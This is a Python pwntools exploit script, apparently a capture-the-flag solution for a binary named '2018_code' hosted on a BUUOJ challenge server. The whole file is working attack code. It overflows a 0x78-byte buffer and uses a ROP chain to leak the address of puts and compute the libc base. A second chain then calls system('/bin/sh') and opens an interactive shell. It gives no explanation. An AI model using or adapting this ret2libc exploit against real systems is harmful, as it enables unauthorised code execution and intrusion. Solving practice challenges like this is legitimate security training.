#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./2018_code')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./2018_code')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',29723)
			elf=ELF('./2018_code')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		io.recv()
		io.send('wyBTs\n')
		io.recv()
		io.send('\x00'*0x78+p64(0x0000000000400983)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400801))
		io.recvline()
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		io.send('\x00'*0x78+p64(0x0000000000400983)+p64(bin_sh_addr)+p64(0x0000000000400981)+p64(0)*2+p64(system_addr)+p64(0x400801))
		io.recvline()



		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue